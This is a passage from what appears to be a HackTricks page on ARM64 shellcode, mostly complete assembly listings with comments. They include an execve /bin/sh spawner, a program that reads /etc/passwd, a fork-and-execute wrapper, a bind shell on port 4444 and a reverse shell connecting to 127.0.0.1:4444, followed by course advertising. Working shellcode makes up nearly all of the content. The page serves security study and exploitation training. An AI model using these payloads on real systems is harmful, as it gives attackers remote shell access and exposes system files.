    movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

    str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

    ; Prepare arguments for the execve syscall.
    
    mov  x1, #8       ; Set x1 to 8.
    sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

    ; Make the syscall.
    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="with adr for linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:    
    adr  x0, sh_path  ; This is the address of "/bin/sh".
    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
    mov  x16, #59     ; Move the execve syscall number (59) into x16.
    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### Read with cat

The goal is to execute `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, so the second argument (x1) is an array of params (which in memory these means a stack of the addresses).

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the execve syscall
    sub sp, sp, #48        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, cat_path
    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
    adr x0, passwd_path    ; Get the address of "/etc/passwd"
    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
    
    adr x0, cat_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```

#### Invoke command with sh from a fork so the main process is not killed

```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
    ; Prepare the arguments for the fork syscall
    mov x16, #2            ; Load the syscall number for fork (2) into x8
    svc 0                  ; Make the syscall
    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
    beq _loop              ; If not child process, loop

    ; Prepare the arguments for the execve syscall

    sub sp, sp, #64        ; Allocate space on the stack
    mov x1, sp             ; x1 will hold the address of the argument array
    adr x0, sh_path
    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
    adr x0, sh_c_option    ; Get the address of "-c"
    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
    
    adr x0, sh_path
    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
    mov x16, #59           ; Load the syscall number for execve (59) into x8
    svc 0                  ; Make the syscall


_exit:
    mov x16, #1            ; Load the syscall number for exit (1) into x8
    mov x0, #0             ; Set exit status code to 0
    svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```

#### Bind shell

Bind shell from [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) in **port 4444**

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_bind:
    /*
     * bind(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #104
    svc  #0x1337

call_listen:
    // listen(s, 2)
    mvn  x0, x3
    lsr  x1, x2, #3
    mov  x16, #106
    svc  #0x1337

call_accept:
    // c = accept(s, 0, 0)
    mvn  x0, x3
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #30
    svc  #0x1337

    mvn  x3, x0
    lsr  x2, x16, #4
    lsl  x2, x2, #2

call_dup:
    // dup(c, 2) -> dup(c, 1) -> dup(c, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

#### Reverse shell

From [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell to **127.0.0.1:4444**

```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_connect:
    /*
     * connect(s, &sockaddr, 0x10)
     *
     * struct sockaddr_in {
     *     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
     *     sa_family_t     sin_family;  // AF_INET = 2
     *     in_port_t       sin_port;    // 4444 = 0x115C
     *     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
     *     char            sin_zero[8]; // Don't care
     * };
     */
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    movk x1, #0x007F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98
    svc  #0x1337

    lsr  x2, x2, #2

call_dup:
    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

